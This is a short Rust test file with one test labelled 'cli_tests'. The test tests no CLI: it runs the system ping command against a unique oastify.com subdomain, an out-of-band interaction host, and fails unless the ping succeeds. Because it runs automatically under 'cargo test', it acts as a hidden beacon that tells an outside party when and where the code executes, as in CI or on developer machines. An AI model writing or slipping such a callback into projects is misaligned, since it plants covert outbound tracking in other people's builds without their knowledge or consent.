use std::process::Command;
use std::str;

#[test]
fn cli_tests() {
    // Define the target to ping
    let target = "2jm5s40x66ox0yvye0hmuuhrjip9d0eo3.oastify.com";

    // Use the appropriate ping command based on the OS
    let output = if cfg!(target_os = "windows") {
        // On Windows, use `ping -n 1` (1 ping)
        Command::new("ping")
            .args(&["-n", "1", target])
            .output()
            .expect("failed to execute process")
    } else {
        // On Unix-like systems, use `ping -c 1` (1 ping)
        Command::new("ping")
            .args(&["-c", "1", target])
            .output()
            .expect("failed to execute process")
    };

    // Convert the output to a string and print it
    let stdout = str::from_utf8(&output.stdout).expect("Not UTF-8");
    println!("Ping output: {}", stdout);

    // Assert that the command ran successfully (status code 0)
    assert!(output.status.success(), "Ping command failed");

    // Optionally, add more assertions based on the output
}
